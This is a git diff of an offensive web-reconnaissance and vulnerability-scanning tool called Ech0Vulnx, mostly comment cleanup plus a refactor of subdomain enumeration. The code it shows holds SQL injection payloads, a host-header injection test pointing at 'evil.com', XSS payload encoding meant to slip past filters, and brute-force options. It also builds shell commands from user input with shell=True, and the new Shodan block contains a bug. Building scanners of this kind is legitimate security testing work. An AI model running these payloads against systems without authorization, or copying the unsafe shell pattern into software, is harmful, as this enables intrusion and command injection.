@@ -68,6 +68,7 @@ warnings.filterwarnings(action='ignore',module='bs4')
 
 requests.packages.urllib3.disable_warnings()
 
+
 banner = f"""
 
 __________     ______ __________    __      ______              
@@ -331,11 +332,14 @@ fuzzing_group.add_argument('-f_p', '--forbidden_pages',
                      metavar='domain.com')
 
 
+nuclei_group.add_argument('-nl', '--nuclei_lfi', action='store_true', help="Find Local File Inclusion with nuclei")
+nuclei_group.add_argument("-nc", "--nuclei", type=str, help="scan nuclei on a target", metavar="domain.com")
+nuclei_group.add_argument("-nct", "--nuclei_template", type=str, help="use a nuclei template", metavar="template.yaml")
+
+
 parser.add_argument("-v", "--verbose", action="store_true", help="Increase output verbosity")
 
 parser.add_argument("-c", "--concurrency", type=int, default=10, help="Maximum number of concurrent requests")
-
-nuclei_group.add_argument('-nl', '--nuclei_lfi', action='store_true', help="Find Local File Inclusion with nuclei")
 
 passiverecon_group.add_argument('-gs', '--google', action='store_true', help='Google Search')
 
@@ -355,7 +359,7 @@ parser.add_argument('--heapdump', help='Analyze Java heapdump file')
 
 parser.add_argument('--output-dir', help='Output directory', default='.')
 
-#  --> Add after existing argument groups
+# Add after existing argument groups
 cloud_group = parser.add_argument_group('Cloud Security')
 cloud_group.add_argument('-aws', '--aws-scan',
                     type=str, help='Scan for exposed AWS resources',
@@ -368,31 +372,31 @@ cloud_group.add_argument('-gcp', '--gcp-scan',
                     type=str, help='Scan for exposed GCP Storage resources',
                     metavar='domain.com')
 
-# -->  Add to argument groups
+# Add to argument groups
 vuln_group.add_argument('-zt', '--zone-transfer', 
                     type=str, help='Test for DNS zone transfer vulnerability',
                     metavar='domain.com')
 
 
-# --> Add to argument groups
+# Add to argument groups
 ip_group = parser.add_argument_group('IP Information')
 ip_group.add_argument('--ipinfo', type=str, help='Get IP info for a company domain/IP', metavar='TARGET')
 ip_group.add_argument('--token', type=str, help='IPinfo API token', metavar='TOKEN')
 ip_group.add_argument('--save-ranges', type=str, help='Save IP ranges to file', metavar='FILENAME')
 parser.add_argument('--forbidden_domains', help='File containing list of domains to scan for forbidden bypass')
 
-# --> Bruteforcing groups
+# Bruteforcing groups
 bruteforcing_group.add_argument('--brute-user-pass', type=str, help='Bruteforcing username and password input fields', metavar='domain.com')
 bruteforcing_group.add_argument('--username_wordlist', type=str, help='Bruteforcing username and password input fields', metavar='domain.com')
 bruteforcing_group.add_argument('--password_wordlist', type=str, help='Bruteforcing username and password input fields', metavar='domain.com')
 
 args = parser.parse_args()
 
-# --> Add new function for IP info scanning
+# Add new function for IP info scanning
 def scan_ip_info(target, token):
     """Get IP ranges and ASN information using IPinfo API"""
     try:
-        # --> First resolve domain to IP if target is a domain
+        # First resolve domain to IP if target is a domain
         try:
             ip = socket.gethostbyname(target)
             if ip != target:
@@ -404,10 +408,10 @@ def scan_ip_info(target, token):
         handler = ipinfo.getHandler(token)
         print(f"{Fore.MAGENTA}Gathering IP information for {Fore.CYAN}{target}{Style.RESET_ALL}\n")
         
-        # --> Get initial IP info using resolved IP
+        # Get initial IP info using resolved IP
         details = handler.getDetails(ip)
         
-        # -->  Print findings
+        # Print findings
         print(f"{Fore.GREEN}IP Information:{Style.RESET_ALL}")
         print(f"IP: {Fore.CYAN}{details.ip}{Style.RESET_ALL}")
         if hasattr(details, 'hostname') and details.hostname:
@@ -419,24 +423,24 @@ def scan_ip_info(target, token):
         if hasattr(details, 'city') and details.city:
             print(f"City: {Fore.CYAN}{details.city}{Style.RESET_ALL}")
 
-        # --> Get ASN information
+        # Get ASN information
         if hasattr(details, 'org') and details.org:
             try:
                 org_parts = details.org.split()
                 if org_parts:
-                    asn = org_parts[0]  # -->  Get ASN number
-                    org_name = ' '.join(org_parts[1:])  # --> Get organization name
+                    asn = org_parts[0]  # Get ASN number
+                    org_name = ' '.join(org_parts[1:])  # Get organization name
                     
                     print(f"\n{Fore.GREEN}ASN Information:{Style.RESET_ALL}")
                     print(f"ASN: {Fore.CYAN}{asn}{Style.RESET_ALL}")
                     print(f"Organization: {Fore.CYAN}{org_name}{Style.RESET_ALL}")
                     
-                    # --> Try to get IP ranges for this ASN
+                    # Try to get IP ranges for this ASN
                     try:
                         ranges = []
                         print(f"\n{Fore.GREEN}IP Ranges:{Style.RESET_ALL}")
                         
-                        # --> Use a separate request to get ranges
+                        # Use a separate request to get ranges
                         response = requests.get(f"https://ipinfo.io/{asn}/prefixes?token={token}")
                         if response.status_code == 200:
                             prefixes_data = response.json()
@@ -454,7 +458,7 @@ def scan_ip_info(target, token):
                                     except ValueError as e:
                                         print(f"{Fore.RED}Error parsing network {netw}: {e}{Style.RESET_ALL}")
                         
-                        # --> Save ranges if requested
+                        # Save ranges if requested
                         if args.save_ranges and ranges:
                             try:
                                 with open(args.save_ranges, 'w') as f:
@@ -479,7 +483,7 @@ def scan_ip_info(target, token):
         print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
         return None
 
-# --> Add to main argument handling
+# Add to main argument handling
 if args.ipinfo:
     if not args.token:
         print(f"{Fore.RED}Error: IPinfo API token required. Use --token to provide it.{Style.RESET_ALL}")
@@ -492,17 +496,17 @@ header = {"User-Agent": user_agent}
 
 async def update_script():
     try:
-        # --> Store current version
-        current_version = "1.0.0"  # --> Replace with your version tracking system
+        # Store current version
+        current_version = "1.0.0"  # Replace with your version tracking system
         backup_dir = "backups"
         
         print(f"{Fore.CYAN}Checking for updates...{Style.RESET_ALL}")
         
-        # --> Create backups directory if it doesn't exist
+        # Create backups directory if it doesn't exist
         if not os.path.exists(backup_dir):
             os.makedirs(backup_dir)
         
-        # --> Create backup of current version
+        # Create backup of current version
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         backup_path = os.path.join(backup_dir, f"Ech0Vulnx_backup_{timestamp}")
         
@@ -516,13 +520,13 @@ async def update_script():
             print(f"{Fore.RED}Backup failed: {str(e)}{Style.RESET_ALL}")
             return False
 
-        # --> Check remote repository for updates
+        # Check remote repository for updates
         print(f"{Fore.CYAN}Checking remote repository...{Style.RESET_ALL}")
         try:
-            # --> Fetch without merging
+            # Fetch without merging
             subprocess.run(["git", "fetch"], check=True, capture_output=True)
             
-            # --> Get current and remote commit hashes
+            # Get current and remote commit hashes
             current = subprocess.run(["git", "rev-parse", "HEAD"], 
                                    check=True, capture_output=True, text=True).stdout.strip()
             remote = subprocess.run(["git", "rev-parse", "@{u}"], 
@@ -536,10 +540,10 @@ async def update_script():
             print(f"{Fore.RED}Failed to check for updates: {str(e)}{Style.RESET_ALL}")
             return False
 
-        # --> Perform update
+        # Perform update
         print(f"{Fore.CYAN}Updating Ech0Vulnx...{Style.RESET_ALL}")
         try:
-            # --> Pull changes
+            # Pull changes
             result = subprocess.run(["git", "pull"], check=True, capture_output=True, text=True)
             
             if "Already up to date" in result.stdout:
@@ -547,7 +551,7 @@ async def update_script():
             else:
                 print(f"{Fore.GREEN}Update successful!{Style.RESET_ALL}")
                 
-                # --> Check for dependency updates
+                # Check for dependency updates
                 requirements_path = "requirements.txt"
                 if os.path.exists(requirements_path):
                     print(f"{Fore.CYAN}Updating dependencies...{Style.RESET_ALL}")
@@ -564,7 +568,7 @@ async def update_script():
             print(f"{Fore.RED}Update failed: {str(e)}{Style.RESET_ALL}")
             print(f"{Fore.YELLOW}Restoring from backup...{Style.RESET_ALL}")
             
-            # --> Restore from backup
+            # Restore from backup
             try:
                 shutil.rmtree(".", ignore_errors=True)
                 shutil.copytree(backup_path, ".", dirs_exist_ok=True)
@@ -579,67 +583,82 @@ async def update_script():
         print(f"{Fore.RED}An unexpected error occurred: {str(e)}{Style.RESET_ALL}")
         return False
 
-# --> In your argument handler:
+# In your argument handler:
 if args.update:
     if asyncio.run(update_script()):
         sys.exit(0)
     else:
         sys.exit(1)
 
-if args.s:
+def process_domain(domain, save_file=None, shodan_api=None):
+    """Process a single domain for subdomain enumeration"""
     current_script_dir = os.path.dirname(os.path.abspath(__file__))
     spotter_path = os.path.join(current_script_dir, 'scripts', 'spotter.sh')
     certsh_path = os.path.join(current_script_dir, 'scripts', 'certsh.sh')
-    if args.save:
-        print(Fore.CYAN + "Saving output to {}...".format(args.save))
-        cmd = f"subfinder -d {args.s} -silent"
-        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-        out, err = p.communicate()
-        out = out.decode() 
-        with open(f"{args.save}", "a") as subfinder:
-            subfinder.writelines(out)
-        if path.exists(f"{args.save}"):
-            print(Fore.GREEN + "DONE!")
-        if not path.exists(f"{args.save}"):
-            print(Fore.RED + "ERROR!")
-            sys.exit(1)
-
-        cmd = f"{spotter_path} {args.s} | uniq | sort"
-        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-        spotterout, err = p.communicate()
-        spotterout = spotterout.decode()
-        with open(f"{args.save}", "a") as spotter:
-            spotter.writelines(spotterout)
-
-        cmd = f"{certsh_path} {args.s} | uniq | sort"
-        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-        certshout, err = p.communicate()
-        certshout = certshout.decode()
-        with open(f"{args.save}", "a") as certsh:
-            certsh.writelines(certshout)
-
-        # --> Shodan subdomain extraction
-        if args.shodan_api:
-            api = shodan.Shodan(args.shodan_api)
-            try:
-                results = api.search(f'hostname:*.{args.s}')
-                shodan_subdomains = set()
-                for result in results['matches']:
-                    hostnames = result.get('hostnames', [])
-                    for hostname in hostnames:
-                        if hostname.endswith(args.s) and hostname != args.s:
-                            shodan_subdomains.add(hostname)
-                with open(f"{args.save}", "a") as shodan_file:
-                    for subdomain in sorted(shodan_subdomains):
-                        shodan_file.write(f"{subdomain}\n")
-                print(Fore.GREEN + f"Added {len(shodan_subdomains)} subdomains from Shodan")
-            except shodan.APIError as e:
-                print(Fore.RED + f"Error querying Shodan: {e}")
+    
+    results = []
+    
+    # Subfinder
+    cmd = f"subfinder -d {domain} -silent"
+    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+    out, _ = p.communicate()
+    results.extend(out.decode().splitlines())
+    
+    # Spotter
+    cmd = f"{spotter_path} {domain} | uniq | sort"
+    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+    spotterout, _ = p.communicate()
+    results.extend(spotterout.decode().splitlines())
+    
+    # Cert.sh
+    cmd = f"{certsh_path} {domain} | uniq | sort"
+    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+    certshout, _ = p.communicate()
+    results.extend(certshout.decode().splitlines())
+    
+    # Shodan
+    if shodan_api:
+        try:
+            api = shodan.Shodan(shodan_api)
+            results = api.search(f'hostname:*.{domain}')
+            for result in results['matches']:
+                hostnames = result.get('hostnames', [])
+                for hostname in hostnames:
+                    if hostname.endswith(domain) and hostname != domain:
+                        results.append(hostname)
+        except shodan.APIError as e:
+            print(Fore.RED + f"Error querying Shodan for {domain}: {e}")
+    
+    # Remove duplicates and sort
+    results = sorted(set(results))
+    
+    if save_file:
+        with open(save_file, "a") as f:
+            for subdomain in results:
+                if "www" in subdomain:
+                    pass
+                else:
+                    f.write(f"{subdomain}\n")
+        print(Fore.GREEN + f"Found {len(results)} subdomains for {domain}")
     else:
-        commands(f"subfinder -d {args.s}")
-        commands(f"assetfinder -subs-only {args.s} | uniq | sort")
-        commands(f"{spotter_path} {args.s} | uniq | sort")
-        commands(f"{certsh_path} {args.s} | uniq | sort")
+        print(Fore.CYAN + f"\nSubdomains for {domain}:\n")
+        for subdomain in results:
+            print(Fore.GREEN + f"{subdomain}")
+
+# Modify the argument parser to accept either a single domain or a file
+if args.s:
+    if os.path.isfile(args.s):
+        # Reading domains from file
+        print(Fore.CYAN + f"Reading domains from {args.s}")
+        with open(args.s) as f:
+            domains = [line.strip() for line in f if line.strip()]
+        
+        for domain in domains:
+            print(Fore.YELLOW + f"\nProcessing {domain}...")
+            process_domain(domain, args.save, args.shodan_api)
+    else:
+        # Single domain
+        process_domain(args.s, args.save, args.shodan_api)
 
 if args.forbidden_pages:
     def save_forbidden_pages(url):
@@ -835,16 +854,16 @@ if args.hostheaderinjection:
             "X-Host": "evil.com"
         }
 
-        # --> Get proxy list
+        # Get proxy list
         proxies = setup_proxies(args.proxy, args.proxy_file)
         current_proxy = None
 
         try:
-            # --> Select proxy if available
+            # Select proxy if available
             if proxies:
                 current_proxy = random.choice(proxies)
 
-            # --> Normal request with proxy
+            # Normal request with proxy
             normal_resp = session.get(
                 domainlist, 
                 verify=False, 
@@ -1733,7 +1752,7 @@ if args.print_all_ips:
 
 
 if args.xss_scan:
-    # --> Define rate limit: 5 calls per second
+    # Define rate limit: 5 calls per second
     CALLS = 5
     RATE_LIMIT = 1
 
@@ -1747,12 +1766,12 @@ if args.xss_scan:
 
     def encode_payload(payload):
         encodings = [
-            lambda x: x,  # -->  No encoding
-            lambda x: quote_plus(x),  # -->  URL encoding
-            lambda x: html.escape(x),  # --> HTML entity encoding
-            lambda x: ''.join(f'%{ord(c):02X}' for c in x),  # -->  Full URL encoding
-            lambda x: ''.join(f'&#x{ord(c):02X};' for c in x),  # --> Hex entity encoding
-            lambda x: ''.join(f'\\u{ord(c):04X}' for c in x),  # --> Unicode escape
+            lambda x: x,  # No encoding
+            lambda x: quote_plus(x),  # URL encoding
+            lambda x: html.escape(x),  # HTML entity encoding
+            lambda x: ''.join(f'%{ord(c):02X}' for c in x),  # Full URL encoding
+            lambda x: ''.join(f'&#x{ord(c):02X};' for c in x),  # Hex entity encoding
+            lambda x: ''.join(f'\\u{ord(c):04X}' for c in x),  # Unicode escape
         ]
         return random.choice(encodings)(payload)
 
@@ -1803,7 +1822,7 @@ if args.xss_scan:
                 except requests.RequestException as e:
                     print(f"{Fore.YELLOW}Error scanning {test_url}: {str(e)}{Fore.RESET}")
                 finally:
-                    bar()  # --> Increment the progress bar for each payload scanned
+                    bar()  # Increment the progress bar for each payload scanned
         
         return vulnerabilities
 
@@ -1816,7 +1835,7 @@ if args.xss_scan:
                 payloads = [x.strip() for x in f.readlines()]
             
             total_payloads = 0
-            # --> Calculate total payloads based on number of URLs and number of payloads per URL
+            # Calculate total payloads based on number of URLs and number of payloads per URL
             for url in urls:
                 parsed_url = urlparse(url)
                 params = parse_qs(parsed_url.query)
@@ -1861,17 +1880,17 @@ if args.xss_scan:
 if args.sqli_scan:
     init(autoreset=True)
 
-    # -->  Rate Limiting Configuration
-    RATE_LIMIT = 5  # --> Maximum number of requests per second
-    REQUEST_INTERVAL = 1 / RATE_LIMIT  # --> Interval between requests in seconds
+    # Rate Limiting Configuration
+    RATE_LIMIT = 5  # Maximum number of requests per second
+    REQUEST_INTERVAL = 1 / RATE_LIMIT  # Interval between requests in seconds
 
     def generate_random_string(length=8):
         return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
     def encode_payload(payload):
         encodings = [
-            lambda x: x,  # --> No encoding
-            lambda x: quote_plus(x),  # --> URL encoding
+            lambda x: x,  # No encoding
+            lambda x: quote_plus(x),  # URL encoding
             lambda x: ''.join(f'%{ord(c):02X}' for c in x),  # Full URL encoding
         ]
         return random.choice(encodings)(payload)
@@ -1891,7 +1910,7 @@ if args.sqli_scan:
         params = parse_qs(parsed_url.query)
         
         for param in params:
-            # --> Error-based SQLi
+            # Error-based SQLi
             error_payloads = [
                 "' OR '1'='1",
                 "' OR '1'='1' --",
@@ -1937,15 +1956,15 @@ if args.sqli_scan:
                                 "type": "Error-based SQLi"
                             }
                             print_queue.put(vulnerability)
-                            bar()  # I--> ncrement progress bar upon finding a vulnerability
-                            return  # --> Exit after finding a vulnerability
+                            bar()  # Increment progress bar upon finding a vulnerability
+                            return  # Exit after finding a vulnerability
                     
                 except requests.RequestException as e:
                     print_queue.put(f"{Fore.YELLOW}Error scanning {test_url}: {str(e)}{Fore.RESET}")
                 finally:
-                    bar()  # --> Increment the progress bar for each payload scanned
+                    bar()  # Increment the progress bar for each payload scanned
             
-            # --> Boolean-based blind SQLi
+            # Boolean-based blind SQLi
             rate_limiter.acquire()
             original_params = params.copy()
             original_params[param] = ["1 AND 1=1"]
@@ -1972,13 +1991,13 @@ if args.sqli_scan:
                         "type": "Boolean-based blind SQLi"
                     }
                     print_queue.put(vulnerability)
-                    bar()  # --> Increment progress bar upon finding a vulnerability
+                    bar()  # Increment progress bar upon finding a vulnerability
             except requests.RequestException as e:
                 print_queue.put(f"{Fore.YELLOW}Error during boolean-based test for {url}: {str(e)}{Fore.RESET}")
             finally:
-                bar()  # --> Increment the progress bar even if vulnerability is found
+                bar()  # Increment the progress bar even if vulnerability is found
                 
-            # --> Time-based blind SQLi
+            # Time-based blind SQLi
             rate_limiter.acquire()
             time_payload = "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1"
             encoded_time_payload = encode_payload(time_payload)
@@ -2008,7 +2027,7 @@ if args.sqli_scan:
             except requests.RequestException as e:
                 print_queue.put(f"{Fore.YELLOW}Error during time-based test for {url}: {str(e)}{Fore.RESET}")
             finally:
-                bar()  # --> Increment the progress bar for each payload scanned
+                bar()  # Increment the progress bar for each payload scanned
 
     def print_worker(print_queue):
         while True:
@@ -2040,12 +2059,12 @@ if args.sqli_scan:
             return []
 
         total_payloads = 0
-        # --> Calculate total payloads based on number of URLs and number of payloads per URL
+        # Calculate total payloads based on number of URLs and number of payloads per URL
         for url in urls:
             parsed_url = urlparse(url)
             params = parse_qs(parsed_url.query)
             if params:
-                # --> Error-based payloads
+                # Error-based payloads
                 error_payloads = [
                     "' OR '1'='1",
                     "' OR '1'='1' --",
@@ -2057,10 +2076,10 @@ if args.sqli_scan:
                 ]
                 total_payloads += len(params) * len(error_payloads)
                 
-                # --> Boolean-based payloads (1 per parameter)
+                # Boolean-based payloads (1 per parameter)
                 total_payloads += len(params) * 1
                 
-                # --> Time-based payloads (1 per parameter)
+                # Time-based payloads (1 per parameter)
                 total_payloads += len(params) * 1
 
         if total_payloads == 0:
@@ -2068,7 +2087,7 @@ if args.sqli_scan:
             return []
 
         all_vulnerabilities = []
-        # --> Initialize the rate limiter
+        # Initialize the rate limiter
         rate_limiter = threading.Semaphore(RATE_LIMIT)
 
         def release_rate_limiter():
@@ -2076,7 +2095,7 @@ if args.sqli_scan:
                 time.sleep(REQUEST_INTERVAL)
                 rate_limiter.release()
 
-        # --> Start a thread to release the semaphore at the defined rate
+        # Start a thread to release the semaphore at the defined rate
         rate_thread = threading.Thread(target=release_rate_limiter, daemon=True)
         rate_thread.start()
 
@@ -2200,13 +2219,13 @@ if args.javascript_scan:
             response = requests.get(url, timeout=10)
             soup = BeautifulSoup(response.text, 'html.parser')
             
-            # --> Find <script> tags with src attribute
+            # Find <script> tags with src attribute
             for script in soup.find_all('script', src=True):
                 script_url = urljoin(url, script['src'])
                 if is_valid_url(script_url):
                     js_files.add(script_url)
             
-            # --> Find JavaScript files in <link> tags
+            # Find JavaScript files in <link> tags
             for link in soup.find_all('link', rel='stylesheet'):
                 if 'href' in link.attrs:
                     css_url = urljoin(url, link['href'])
@@ -2218,7 +2237,7 @@ if args.javascript_scan:
                             if is_valid_url(full_js_url):
                                 js_files.add(full_js_url)
             
-            # --> Find JavaScript files mentioned in inline scripts
+            # Find JavaScript files mentioned in inline scripts
             for script in soup.find_all('script'):
                 if script.string:
                     js_urls = re.findall(r'[\'"]([^\'"]*\.js)[\'"]', script.string)
@@ -2311,7 +2330,7 @@ if args.javascript_endpoints:
         return None
 
     def find_endpoints(js_content):
-        # --> This regex pattern looks for common endpoint patterns in JavaScript
+        # This regex pattern looks for common endpoint patterns in JavaScript
         endpoint_pattern = r'(?:"|\'|\`)(/(?:api/)?[\w-]+(?:/[\w-]+)*(?:\.\w+)?)'
         endpoints = set(re.findall(endpoint_pattern, js_content))
         return endpoints
@@ -3046,19 +3065,19 @@ if args.autorecon:
             with open('site_links.txt', 'w') as f:
                 for link in site_links:
                     f.write(f"{link}\n")
-            bar()  # --> Update after crawling site
+            bar()  # Update after crawling site
 
-            all_links = site_links  # --> Only site links now
+            all_links = site_links  # Only site links now
 
-            # --> Extract JavaScript files, passing the 
+            # Extract JavaScript files, passing the 
             js_files = await extract_js_files(all_links, target)
             print(f"{Fore.MAGENTA}Found {Fore.CYAN}{len(js_files)}{Style.RESET_ALL} JavaScript files.")
             with open('js_files.txt', 'w') as f:
                 for js_file in js_files:
                     f.write(f"{js_file}\n")
-            bar()  # -->  Update after extracting JS files
+            bar()  # Update after extracting JS files
 
-            # --> Wayback urls 
+            #Wayback urls 
             waybackurls = await waybackpy(target)
             with open('waybackurls.txt', 'w') as f:
                 f.write(f"{waybackurls}\n")
@@ -3066,9 +3085,9 @@ if args.autorecon:
             with open('waybackurls.txt', 'r') as f:
                 waybackurls_lines = [line.strip() for line in f if line.strip()]
                 print(f"{Fore.MAGENTA}Found {Fore.CYAN}{len(waybackurls_lines)}{Style.RESET_ALL} waybackurls.")
-            bar()  # -->  Update after waybackurls
+            bar()  # Update after waybackurls
 
-            # --> Naabu portscan
+            #Naabu portscan
             ports = await portscan(target)
             with open('ports.txt', 'w') as f:
                 f.write(f"{ports}\n")
@@ -3081,9 +3100,9 @@ if args.autorecon:
                     numbers.extend(found_numbers)     
                 print(f"{Fore.MAGENTA}Found {Fore.CYAN}{len(ports_lines)}{Style.RESET_ALL} Open Ports.")
                 print(f"{Fore.MAGENTA}Open Ports: {Fore.CYAN}{', '.join(map(str, numbers))}{Style.RESET_ALL}")
-            bar()  # -->  Update after ports scan
+            bar()  # Update after ports scan
 
-            # --> Get headers
+            #Get headers
             getheaders = await headers_info(target)
             target2 = target.replace("https://", "").replace("http://", "").replace("www.", "")
             with open(f"headers.txt", "w") as f:
@@ -3091,12 +3110,12 @@ if args.autorecon:
                     f.write(f"{header}\n")
             bar()
 
-            # --> Server info
+            #Server info
             serverinfo = await server_info(target)
             print(f"{Fore.MAGENTA}Server: {Fore.CYAN}{serverinfo}{Style.RESET_ALL}")
             bar()
 
-            # --> Dnsscan
+            #Dnsscan
             dns = await dnsscan(target)
             with open('dnsscan.json', 'w') as f:
                 f.write(f"{dns}\n")
@@ -3104,7 +3123,7 @@ if args.autorecon:
             dns_output = scan(f"python3 dnsparser.py -dns dnsscan.json")
             with open('dns_output.txt', 'w') as f:
                 f.write(f"{dns_output}\n")
-            bar()  # -->  Update after dnsscan
+            bar()  # Update after dnsscan
 
             parameters = extract_parameters(all_links)
             links_params = set()
@@ -3113,18 +3132,18 @@ if args.autorecon:
             with open('links_params.txt', 'w') as f:
                 for link in links_params:
                     f.write(f"{link}\n")
-            bar()  #  --> Update after extracting parameters
+            bar()  # Update after extracting parameters
 
-            # --> Print parameters for each link
+            # Print parameters for each link
             for link in links_params:
                 print(f"{Fore.MAGENTA}Found {Fore.CYAN}{len(links_params)}{Style.RESET_ALL} Links with Parameters")
 
-            #  --> Perform Shodan search and save results to a file
+            # Perform Shodan search and save results to a file
             shodan_results = shodan_search(target, shodankey)
             with open('shodan_results.txt', 'w') as f:
                 for result in shodan_results:
                     f.write(f"{result}\n")
-            bar()  # -->  Update after Shodan search
+            bar()  # Update after Shodan search
 
             ssl_scan = await ssl_vuln_scan(target)  
             print(f"{Fore.MAGENTA}TLS/SSL Scan: {Fore.CYAN}ssl_info.txt{Style.RESET_ALL}")
@@ -3224,7 +3243,7 @@ if args.aws_scan:
     target = args.aws_scan
     print(f"\n{Fore.MAGENTA}Starting AWS Security Scan for {Fore.CYAN}{target}{Style.RESET_ALL}")
     
-    # --> Scan AWS services
+    # Scan AWS services
     aws_findings = check_aws_services(target)
     if aws_findings:
         print(f"\n{Fore.RED}Found exposed AWS services:{Style.RESET_ALL}")
@@ -3233,7 +3252,7 @@ if args.aws_scan:
             print(f"URL: {Fore.CYAN}{finding['url']}{Style.RESET_ALL}")
             print(f"Status: {finding['status']}")
             
-    # -->  Check IAM exposure
+    # Check IAM exposure
     iam_findings = check_iam_exposure(target)
     if iam_findings:
         print(f"\n{Fore.RED}Found exposed IAM endpoints:{Style.RESET_ALL}")
@@ -3241,7 +3260,7 @@ if args.aws_scan:
             print(f"Endpoint: {Fore.CYAN}{finding['endpoint']}{Style.RESET_ALL}")
             print(f"Status: {finding['status']}")
             
-    # --> Save results
+    # Save results
     timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
     with open(f'aws_scan_{timestamp}.json', 'w') as f:
         json.dump({
@@ -3307,7 +3326,7 @@ if args.azure_scan:
     target = args.azure_scan
     print(f"\n{Fore.MAGENTA}Starting Azure Security Scan for {Fore.CYAN}{target}{Style.RESET_ALL}")
     
-    # --> Scan Azure services
+    # Scan Azure services
     azure_findings = check_azure_services(target)
     if azure_findings:
         print(f"\n{Fore.RED}Found exposed Azure services:{Style.RESET_ALL}")
@@ -3316,7 +3335,7 @@ if args.azure_scan:
             print(f"URL: {Fore.CYAN}{finding['url']}{Style.RESET_ALL}")
             print(f"Status: {finding['status']}")
             
-    # --> Check management endpoints
+    # Check management endpoints
     mgmt_findings = check_management_endpoints(target)
     if mgmt_findings:
         print(f"\n{Fore.RED}Found exposed management endpoints:{Style.RESET_ALL}")
@@ -3324,7 +3343,7 @@ if args.azure_scan:
             print(f"Endpoint: {Fore.CYAN}{finding['endpoint']}{Style.RESET_ALL}")
             print(f"Status: {finding['status']}")
             
-    # --> Save results
+    # Save results
     timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
     with open(f'azure_scan_{timestamp}.json', 'w') as f:
         json.dump({
@@ -3333,7 +3352,7 @@ if args.azure_scan:
         }, f, indent=4)
     print(f"\n{Fore.GREEN}Results saved to azure_scan_{timestamp}.json{Style.RESET_ALL}")
 
-# --> Add implementation
+# Add implementation
 if args.zone_transfer:
     print(f"{Fore.MAGENTA}Testing DNS Zone Transfer for {Fore.CYAN}{args.zone_transfer}{Style.RESET_ALL}\n")
     
@@ -3409,7 +3428,7 @@ async def handle_gcp_scan(target):
         
         print(f"{Fore.BLUE}[*] Scanning for exposed GCP Storage resources for {target}{Style.RESET_ALL}")
         
-        # --> Common GCP bucket naming patterns
+        # Common GCP bucket naming patterns
         bucket_patterns = [
             f"{target}",
             f"{target}-storage",
@@ -3438,7 +3457,7 @@ async def handle_gcp_scan(target):
             f"{target.split('.')[0]}"
         ]
         
-        # --> Add variations with company name
+        # Add variations with company name
         company_name = target.split('.')[0]
         bucket_patterns.extend([
             f"gcp-{company_name}",
@@ -3466,7 +3485,7 @@ async def handle_gcp_scan(target):
         else:
             print(f"{Fore.YELLOW}[!] No exposed GCP Storage buckets found{Style.RESET_ALL}")
         
-        # --> Check for other GCP services
+        # Check for other GCP services
         await check_gcp_services(target)
     except Exception as e:
         print(f"{Fore.RED}[!] Error during GCP scan: {str(e)}{Style.RESET_ALL}")
@@ -3486,9 +3505,9 @@ def check_gcp_bucket(bucket_name):
         
         response = requests.get(bucket_url, timeout=10)
         
-        # --> Check if bucket exists
+        # Check if bucket exists
         if response.status_code == 200:
-            # --> Check if we can list bucket contents
+            # Check if we can list bucket contents
             if "ListBucketResult" in response.text:
                 print(f"{Fore.RED}[!] Found publicly accessible GCP bucket: {bucket_url}{Style.RESET_ALL}")
                 return bucket_url
@@ -3496,7 +3515,7 @@ def check_gcp_bucket(bucket_name):
                 print(f"{Fore.YELLOW}[!] Found GCP bucket but cannot list contents: {bucket_url}{Style.RESET_ALL}")
                 return bucket_url
         
-        # --> Check for access denied (bucket exists but is not public)
+        # Check for access denied (bucket exists but is not public)
         elif response.status_code == 403:
             print(f"{Fore.YELLOW}[!] Found GCP bucket but access is denied: {bucket_url}{Style.RESET_ALL}")
             return None
@@ -3517,7 +3536,7 @@ async def check_gcp_services(domain):
         domain: Domain to check
     """
     try:
-        # --> Clean up the domain to extract just the domain name
+        # Clean up the domain to extract just the domain name
         if domain.startswith(('http://', 'https://')):
             parsed_url = urlparse(domain)
             domain = parsed_url.netloc
@@ -3525,7 +3544,7 @@ async def check_gcp_services(domain):
         
         print(f"{Fore.BLUE}[*] Checking for exposed GCP services for {domain}{Style.RESET_ALL}")
         
-        # --> Common GCP service endpoints to check
+        # Common GCP service endpoints to check
         gcp_services = [
             {"name": "Cloud Run", "url_pattern": f"https://{domain.split('.')[0]}-[a-z0-9]{{16}}.run.app", "regex": True},
             {"name": "App Engine", "url_pattern": f"https://{domain.split('.')[0]}.appspot.com", "regex": False},
@@ -3536,8 +3555,8 @@ async def check_gcp_services(domain):
         
         for service in gcp_services:
             if service.get("regex", False):
-                # --> For regex patterns, we need to do DNS enumeration or other techniques
-                # --> This is a simplified placeholder
+                # For regex patterns, we need to do DNS enumeration or other techniques
+                # This is a simplified placeholder
                 print(f"{Fore.YELLOW}[!] Regex-based detection for {service['name']} requires additional enumeration{Style.RESET_ALL}")
                 continue
             
@@ -3546,17 +3565,17 @@ async def check_gcp_services(domain):
                 response = requests.get(url, timeout=10)
                 
                 if service.get("header"):
-                    # --> Check for specific header
+                    # Check for specific header
                     if service["header"] in response.headers and service["value"].lower() in response.headers[service["header"]].lower():
                         print(f"{Fore.GREEN}[+] Found {service['name']}: {url}{Style.RESET_ALL}")
                         continue
                 
-                # --> Check based on status code
+                # Check based on status code
                 if response.status_code < 400:
                     print(f"{Fore.GREEN}[+] Found {service['name']}: {url}{Style.RESET_ALL}")
                 
             except requests.exceptions.RequestException:
-                # --> Service endpoint not found or not accessible
+                # Service endpoint not found or not accessible
                 pass
             except Exception as e:
                 print(f"{Fore.RED}[!] Error checking {service['name']}: {str(e)}{Style.RESET_ALL}")
@@ -3571,7 +3590,7 @@ def check_gcp_exposure(domain):
         domain: Domain to check
     """
     try:
-        # --> Clean up the domain to extract just the domain name
+        # Clean up the domain to extract just the domain name
